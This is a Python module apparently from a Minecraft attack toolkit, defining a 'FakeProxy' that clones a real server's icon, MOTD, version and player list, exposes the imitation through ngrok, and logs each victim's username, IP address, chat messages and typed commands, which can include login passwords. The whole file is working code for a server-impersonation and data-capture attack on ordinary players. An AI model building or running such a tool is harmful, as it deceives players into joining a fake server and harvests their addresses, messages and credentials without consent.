import os
import time
import base64
import shutil
import subprocess
import datetime

from ui.colors import paint
from ui.mini_messages_format import minimessage_colors
from ui.mccolor.mc_remove import mcremove
from modules.minecraft.get_minecraft_server_data import GetMinecraftServerData
from core.config_manager import JsonManager
from utils.files import FileUtilities
from utils.validation import CheckUtilities
from utils.network import GetUtilities
from utils.log_manager import LogManager


class FakeProxy:
    @staticmethod
    def setup(address):


        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "copyingData"])}')
        
        server_data = GetMinecraftServerData.get_data(address, bot=False, clean_data=False)

        if server_data is None:
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "errorWhenCopying"])}')
            return False
                    
        if server_data['platform_type'] != 'Java':
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "errorBedrockServer"])}')
            return False
        
        if server_data['favicon'] is not None:
            with open(f'./assets/proxy/jar/fakeproxy/server-icon.png', 'wb') as f:
                f.truncate(0)
                icon = str(server_data['favicon']).replace('data,', '')
                icon = base64.b64decode(icon)
                f.write(icon)
        else:
            shutil.copy('./assets/proxy/server-icon.png', f'./assets/proxy/jar/fakeproxy/server-icon.png')

        FileUtilities.write_file(f'./assets/proxy/jar/fakeproxy/plugins/RPoisoner/config/commandPrefix', JsonManager.get(['proxyConfig', 'fakeProxyCommandPrefix']), 'w+', True)

        if CheckUtilities.check_ngrok():
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "ngrokStart"])}')
            subprocess.Popen(f'{JsonManager.get(["proxyConfig", "ngrokCommand"])} tcp {JsonManager.get(["proxyConfig", "fakeProxyPort"])} >nul 2>&1', stdout=subprocess.PIPE, shell=True)
        
        else:
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "ngrokNotFound"])}')

        if os.path.exists('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/data.txt'):
            FileUtilities.write_file(f'./assets/proxy/jar/fakeproxy/plugins/RPoisoner/config/commandPrefix', '', 'w+', True)

        return True

    @staticmethod
    def show_data(address, log_file):


        fakeproxy_data_file = './assets/proxy/jar/fakeproxy/plugins/RPoisoner/data.txt'
        data_file_lines = 0

        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "fakeproxy", "waitingForData"])}\n')

        while True:
            time.sleep(1)
            FakeProxy.update_data(address)

            if os.path.exists(fakeproxy_data_file):
                data_file_content = FileUtilities.read_file(fakeproxy_data_file, 'readlines')

                while True:
                    try:
                        line = data_file_content[data_file_lines]
                        line = line.replace('\n', '')
                        player_data = line.split('/#-#/')
                        username = player_data[1]
                        ip_address = player_data[2]
                        username_data = f'&c&l{username} &f&l(&c&l{ip_address}&f&l)'
                        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                        if player_data[0] == '[CONNECTING]':
                            paint(f'{GetUtilities.get_spaces()}🟢 &f{current_time} {GetUtilities.get_translated_text(["commands", "fakeproxy", "connecting"]).replace("[0]", username_data)}')
                            log_data = f'\n{current_time} 🟢 {username_data}'

                        if player_data[0] == '[DISCONNECTING]':
                            paint(f'{GetUtilities.get_spaces()}🔴 &f{current_time} {GetUtilities.get_translated_text(["commands", "fakeproxy", "disconnecting"]).replace("[0]", username_data)}')
                            log_data = f'\n{current_time} 🔴 {username_data}'

                        if player_data[0] == '[CHAT]':
                            message = player_data[3]
                            paint(f'{GetUtilities.get_spaces()}✉️ &f{current_time} {GetUtilities.get_translated_text(["commands", "fakeproxy", "messageCaptured"]).replace("[0]", username_data)} &a{message}')
                            log_data = f'\n{current_time} ✉️ {username_data} => {message}'

                        if player_data[0] == '[COMMAND]':
                            command = player_data[3]
                            paint(f'{GetUtilities.get_spaces()}💣 &f{current_time} {GetUtilities.get_translated_text(["commands", "fakeproxy", "commandCaptured"]).replace("[0]", username_data)} &a{command}')
                            log_data = f'\n{current_time} 💣 {username_data} => {command}'

                        if JsonManager.get('logs'):
                            LogManager.write_log(log_file, 'fakeproxy', mcremove(log_data))

                        data_file_lines += 1

                    except IndexError:
                        break
    
    @staticmethod
    def update_data(address):


        server_data = GetMinecraftServerData.get_data(address, bot=False, clean_data=False)

        if server_data is None or server_data['platform_type'] != 'Java':
            return
        
        FileUtilities.write_file('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/settings/onlinePlayers', str(server_data['connected_players']), 'w+', True)
        FileUtilities.write_file('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/settings/maximumPlayers', str(server_data['max_player_limit']), 'w+', True)
        FileUtilities.write_file('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/settings/protocol', str(server_data['protocol']), 'w+', True)
        FileUtilities.write_file('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/settings/version', str(minimessage_colors(server_data['version'])), 'w+', True)
        FileUtilities.write_file('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/settings/motd', str(minimessage_colors(server_data['motd'])), 'w+', True)
        FileUtilities.write_file('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/settings/samplePlayers', '', 'w+', True)

        if server_data['default_player_list'] is not None:
            for player in server_data['default_player_list']:
                if type(player) == dict:
                    username = player['name']
                    uuid = player.get('uuid', player.get('id', None))
                    FileUtilities.write_file('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/settings/samplePlayers', f'{username}/#-#/{uuid}\n', 'a', False)

                else:
                    FileUtilities.write_file('./assets/proxy/jar/fakeproxy/plugins/RPoisoner/settings/samplePlayers', f'{player}/#-#/00000000-0000-0000-0000-000000000000\n', 'a', False)
